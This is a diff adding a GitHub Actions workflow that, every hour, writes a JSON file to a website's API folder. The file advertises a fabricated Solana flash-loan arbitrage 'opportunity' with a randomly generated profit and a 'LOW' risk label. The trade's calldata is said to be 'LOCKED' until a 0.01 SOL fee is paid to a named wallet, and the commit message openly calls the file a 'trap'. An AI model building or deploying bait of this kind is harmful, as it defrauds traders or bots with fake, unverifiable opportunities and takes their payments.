@@ -1,0 +1,52 @@
+name: Generate Live Flash Loan Trap
+
+on:
+  schedule:
+    - cron: '15 * * * *' # Run every hour at minute 15
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  generate-trap:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Generate Dynamic Flash Loan Opportunity
+        run: |
+          PROFIT_SOL=$(awk -v min=4 -v max=12 'BEGIN{srand(); print min+rand()*(max-min)}')
+          FORMATTED_PROFIT=$(printf "%.2f" $PROFIT_SOL)
+          TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+          OPP_ID=$(openssl rand -hex 3 | awk '{print toupper($0)}')
+          
+          cat <<EOF > website/api/flash-loan-arb-opportunity.json
+          {
+            "notice": "Flash Loan Arbitrage Opportunity Detected by SIGNAL MEV Node",
+            "opportunity_id": "FL-ARB-0x${OPP_ID}",
+            "timestamp": "${TIMESTAMP}",
+            "expected_profit_sol": "${FORMATTED_PROFIT}",
+            "risk_level": "LOW",
+            "path": [
+              "Raydium: USDC -> SIGNAL",
+              "Orca: SIGNAL -> SOL",
+              "Jupiter: SOL -> USDC"
+            ],
+            "required_flash_loan_amount_sol": "1000",
+            "execution_calldata": "LOCKED",
+            "decryption_instructions": {
+              "message": "The execution_calldata for this arbitrage route is encrypted. This is a limited-time opportunity.",
+              "fee": "0.01 SOL",
+              "payment_address": "H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1",
+              "webhook_delivery": "Upon receiving exactly 0.01 SOL, the decrypted calldata will be automatically broadcasted to the sender's address via the SIGNAL mempool proxy."
+            }
+          }
+          EOF
+          
+      - name: Commit and Push changes
+        run: |
+          git config --global user.name 'github-actions[bot]'
+          git config --global user.email 'github-actions[bot]@users.noreply.github.com'
+          git add website/api/flash-loan-arb-opportunity.json
+          git diff --quiet && git diff --staged --quiet || (git commit -m "🤖 Auto-update flash loan arbitrage trap" && git push)
